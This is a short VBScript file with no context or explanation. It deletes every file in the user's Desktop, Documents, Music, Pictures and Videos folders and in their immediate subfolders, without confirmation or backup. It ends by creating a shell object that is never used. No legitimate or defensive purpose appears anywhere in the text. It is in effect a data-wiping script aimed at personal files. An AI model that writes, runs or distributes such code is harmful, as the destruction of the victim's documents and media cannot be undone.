Option Explicit

Dim objFSO, objFolder, objSubFolder, objFile, objShell

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Loop through each special folder and delete files
For Each objFolder In Array("Desktop", "Documents", "Music", "Pictures", "Videos")
' Get the current special folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders(objFolder))
' Loop through each subfolder in the current special folder and delete files
For Each objSubFolder in objFolder.SubFolders
    ' Loop through each file in the current subfolder and delete it
    For Each objFile In objSubFolder.Files
        objFSO.DeleteFile(objFile)
    Next
Next

' Loop through each file in the current special folder and delete it
For Each objFile In objFolder.Files
    objFSO.DeleteFile(objFile)
Next
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objSubFolder = Nothing
Set objFolder = Nothing
Set objFSO = Nothing

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")
